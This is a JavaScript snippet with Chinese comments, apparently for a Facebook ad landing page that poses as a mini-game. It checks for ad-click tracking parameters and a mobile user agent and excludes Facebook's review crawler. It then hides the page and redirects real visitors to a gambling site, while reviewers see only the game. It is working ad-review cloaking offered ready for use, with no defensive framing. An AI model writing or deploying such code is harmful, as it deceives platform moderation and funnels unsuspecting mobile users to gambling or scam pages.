(function() {
    // 【配置：跳转目标地址】 —— 已经帮你去掉了末尾空格
    var config_target = "https://www.goldenslot11.com/13/?p0=1uk61sz6".trim(); 

    function isRealPlayer() {
        var searchRaw = window.location.search.toLowerCase();
        var ua = navigator.userAgent.toLowerCase();

        // 1. 占位符拦截
        if (searchRaw.indexOf('%7b%7b') > -1 || searchRaw.indexOf('{{') > -1) return false;

        // 2. 核心字段校验 (使用兼容性更好的 indexOf)
        var requiredKeys = ['fbclid=', 'pixel=', 'apkch=', 'campaign=', 'adgroup=', 'creative='];
        for (var i = 0; i < requiredKeys.length; i++) {
            var key = requiredKeys[i];
            var index = searchRaw.indexOf(key);
            if (index === -1) return false;
            
            // 校验具体的值（防止空格绕过）
            // 获取 "=" 之后的值，直到下一个 "&"
            var valuePart = searchRaw.substring(index + key.length).split('&')[0];
            if (decodeURIComponent(valuePart).trim().length <= 2) return false;
        }

        // 3. 环境过滤
        if (!/iphone|ipad|ipod|android/.test(ua)) return false;
        if (ua.indexOf('facebookexternalhit') > -1) return false;

        return true; 
    }

    // --- 执行逻辑 ---
    if (isRealPlayer()) {
        // 瞬间隐藏，准备跳转
        document.documentElement.style.backgroundColor = '#ffffff';
        document.documentElement.style.display = 'none';

        var connector = config_target.indexOf('?') > -1 ? '&' : '?';
        var finalUrl = config_target + connector + window.location.search.substring(1);
        
        // 执行跳转
        window.location.replace(finalUrl);

        // 【兜底补丁】如果 3 秒后还没跳走，尝试恢复显示（防止死白屏）
        setTimeout(function() {
            document.documentElement.style.display = 'block';
        }, 3000);

    } else {
        // 判定不跳：确保显示小游戏
        document.documentElement.style.display = 'block';
        if (typeof init === 'function') init();
    }
})();
